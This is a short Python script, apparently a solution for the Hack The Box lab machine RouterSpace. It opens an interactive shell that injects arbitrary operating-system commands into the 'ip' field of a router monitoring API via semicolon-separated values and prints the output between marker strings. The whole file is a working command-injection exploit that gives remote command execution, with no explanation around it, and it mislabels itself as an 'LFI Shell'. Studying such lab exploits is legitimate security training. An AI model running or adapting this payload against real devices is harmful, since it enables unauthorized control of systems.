import re
from cmd import Cmd
import requests
#HTB RouterSpace

API_ENDPOINT = 'http://routerspace.htb:80/api/v4/monitoring/router/dev/check/deviceAccess'
SPACER = 'AAAA'


class Term(Cmd):
    intro = 'Welcome to Simple LFI Shell..'
    prompt = 'Send->:'

    def default(self, args):
        output = self.run_cmd_on_server(args)
        print(output)

    def run_cmd_on_server(self, args):
        headers = {"user-agent": "RouterSpaceAgent",
                   "Content-Type": "application/json"}
        payload = {"ip": f";echo -n {SPACER};{args};echo -n {SPACER}"}
        # print("Payload : ", payload)
        response = requests.post(url=API_ENDPOINT, headers=headers, json=payload).text
        response = str(response.replace('\\n', '\n'))
        clean_message = re.search(f'{SPACER}(.*?){SPACER}', response, re.DOTALL)
        clean_msg = clean_message.group(1) if clean_message else "Error in Syntax..."
        return clean_msg


if __name__ == '__main__':
    Term().cmdloop()
